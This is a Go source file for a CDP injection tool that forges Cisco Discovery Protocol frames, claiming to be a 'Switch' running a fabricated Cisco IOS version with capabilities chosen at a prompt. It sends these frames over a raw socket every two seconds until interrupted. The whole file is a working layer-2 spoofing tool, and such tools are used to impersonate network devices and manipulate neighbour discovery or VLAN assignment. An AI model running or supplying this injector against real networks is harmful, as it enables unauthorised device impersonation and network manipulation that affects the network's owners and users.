package cdpinject

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"time"
)

const (
	cdpTag = "\x1b[34m[CDP]\x1b[0m"

	cdpVer = 2
	cdpTTL = 180
)

var cdpDst = [6]byte{0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc}

type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Injector performs CDP "Setting up a virtual device" injection.
type Injector struct {
	Interface string
	SourceMAC string
}

func (i *Injector) Run() error {
	iface, err := net.InterfaceByName(i.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", i.Interface, err)
	}
	src, err := resolveMAC(iface, i.SourceMAC)
	if err != nil {
		return err
	}
	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	caps, err := promptCapabilities()
	if err != nil {
		return err
	}
	frame := buildInjectFrame(src, caps)
	fmt.Printf("%s Starting CDP injection (virtual device) on %s from %s\n", cdpTag, iface.Name, src)

	var sent int64
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Injection stopped. Total frames sent: %d\n", cdpTag, atomic.LoadInt64(&sent))
		os.Exit(0)
	}()

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for {
		if err := sock.Send(frame); err != nil {
			fmt.Fprintf(os.Stderr, "%s send failed: %v\n", cdpTag, err)
		} else {
			n := atomic.AddInt64(&sent, 1)
			fmt.Printf("%s Injected virtual CDP device frame (%d)\n", cdpTag, n)
		}
		<-ticker.C
	}
}

func resolveMAC(iface *net.Interface, override string) (net.HardwareAddr, error) {
	if strings.TrimSpace(override) == "" {
		if len(iface.HardwareAddr) != 6 {
			return nil, fmt.Errorf("interface %s has invalid MAC", iface.Name)
		}
		return iface.HardwareAddr, nil
	}
	m, err := net.ParseMAC(strings.TrimSpace(override))
	if err != nil {
		return nil, fmt.Errorf("invalid --src-mac: %w", err)
	}
	if len(m) != 6 {
		return nil, fmt.Errorf("invalid --src-mac length")
	}
	return m, nil
}

func buildInjectFrame(srcMAC net.HardwareAddr, caps uint32) []byte {
	tlvs := make([]byte, 0, 512)
	tlvs = append(tlvs, tlvString(0x0001, "Switch")...)             // Device ID
	tlvs = append(tlvs, tlvString(0x0005, sampleIOS())...)          // Software version
	tlvs = append(tlvs, tlvString(0x0006, "Cisco ")...)             // Platform
	tlvs = append(tlvs, tlvAddressesNone()...)                      // Addresses
	tlvs = append(tlvs, tlvString(0x0003, "GigabitEthernet0/0")...) // Port ID
	tlvs = append(tlvs, tlvU32(0x0004, caps)...)                    // Capabilities
	tlvs = append(tlvs, tlvString(0x0009, "")...)                   // VTP domain
	tlvs = append(tlvs, tlvU16(0x000a, 1)...)                       // Native VLAN
	tlvs = append(tlvs, tlvByte(0x000b, 1)...)                      // Duplex full
	tlvs = append(tlvs, tlvByte(0x0012, 0x00)...)                   // Trust bitmap
	tlvs = append(tlvs, tlvByte(0x0013, 0x00)...)                   // Untrusted CoS
	tlvs = append(tlvs, tlvMgmtAddressesNone()...)                  // Mgmt addresses

	cdp := make([]byte, 4+len(tlvs))
	cdp[0] = cdpVer
	cdp[1] = cdpTTL
	copy(cdp[4:], tlvs)
	binary.BigEndian.PutUint16(cdp[2:4], cdpChecksum(cdp))

	llc := [8]byte{0xaa, 0xaa, 0x03, 0x00, 0x00, 0x0c, 0x20, 0x00}
	payloadLen := len(llc) + len(cdp)
	frame := make([]byte, 14+payloadLen)
	copy(frame[0:6], cdpDst[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], uint16(payloadLen))
	copy(frame[14:22], llc[:])
	copy(frame[22:], cdp)
	return frame
}

func promptCapabilities() (uint32, error) {
	fmt.Println("Choose CDP capabilities to inject (single letters, comma-separated or combined):")
	fmt.Println("R Router = 0x00000001")
	fmt.Println("T Trans Bridge = 0x00000002")
	fmt.Println("B Source Route Bridge = 0x00000004")
	fmt.Println("S Switch = 0x00000008")
	fmt.Println("H Host = 0x00000010")
	fmt.Println("I IGMP = 0x00000020")
	fmt.Println("r Repeater = 0x00000040")
	fmt.Println("P Phone = 0x00000080")
	fmt.Println("D Remote = 0x00000100")
	fmt.Println("C CVTA = 0x00000200")
	fmt.Println("M Two-port MAC Relay = 0x00000400")
	fmt.Print("Enter capabilities (default H): ")

	reader := bufio.NewReader(os.Stdin)
	line, err := reader.ReadString('\n')
	if err != nil {
		return 0, fmt.Errorf("read capabilities: %w", err)
	}
	return parseCapabilities(line)
}

func parseCapabilities(input string) (uint32, error) {
	m := map[rune]uint32{
		'R': 0x00000001,
		'T': 0x00000002,
		'B': 0x00000004,
		'S': 0x00000008,
		'H': 0x00000010,
		'I': 0x00000020,
		'r': 0x00000040,
		'P': 0x00000080,
		'D': 0x00000100,
		'C': 0x00000200,
		'M': 0x00000400,
	}

	in := strings.TrimSpace(input)
	if in == "" {
		return m['H'], nil
	}

	var caps uint32
	for _, tok := range strings.Split(in, ",") {
		tok = strings.TrimSpace(tok)
		if tok == "" {
			continue
		}
		for _, ch := range tok {
			bit, ok := m[ch]
			if !ok {
				return 0, fmt.Errorf("unknown capability %q", string(ch))
			}
			caps |= bit
		}
	}
	if caps == 0 {
		return 0, fmt.Errorf("no valid capabilities selected")
	}
	return caps, nil
}

func sampleIOS() string {
	return "Cisco IOS Software, vios_l2 Software (vios_l2-ADVENTERPRISEK9-M), Experimental Version 15.2(20200924:215240)\n" +
		"Copyright (c) 1986-2020 by Cisco Systems, Inc.\n" +
		"Compiled Tue 29-Sep-20 11:53 by sweickge"
}

func tlvString(t uint16, s string) []byte {
	b := make([]byte, 4+len(s))
	binary.BigEndian.PutUint16(b[0:2], t)
	binary.BigEndian.PutUint16(b[2:4], uint16(len(b)))
	copy(b[4:], []byte(s))
	return b
}

func tlvU32(t uint16, v uint32) []byte {
	b := make([]byte, 8)
	binary.BigEndian.PutUint16(b[0:2], t)
	binary.BigEndian.PutUint16(b[2:4], 8)
	binary.BigEndian.PutUint32(b[4:8], v)
	return b
}

func tlvU16(t uint16, v uint16) []byte {
	b := make([]byte, 6)
	binary.BigEndian.PutUint16(b[0:2], t)
	binary.BigEndian.PutUint16(b[2:4], 6)
	binary.BigEndian.PutUint16(b[4:6], v)
	return b
}

func tlvByte(t uint16, v byte) []byte {
	b := make([]byte, 5)
	binary.BigEndian.PutUint16(b[0:2], t)
	binary.BigEndian.PutUint16(b[2:4], 5)
	b[4] = v
	return b
}

func tlvAddressesNone() []byte {
	b := make([]byte, 8)
	binary.BigEndian.PutUint16(b[0:2], 0x0002)
	binary.BigEndian.PutUint16(b[2:4], 8)
	return b
}

func tlvMgmtAddressesNone() []byte {
	b := make([]byte, 8)
	binary.BigEndian.PutUint16(b[0:2], 0x0016)
	binary.BigEndian.PutUint16(b[2:4], 8)
	return b
}

func cdpChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
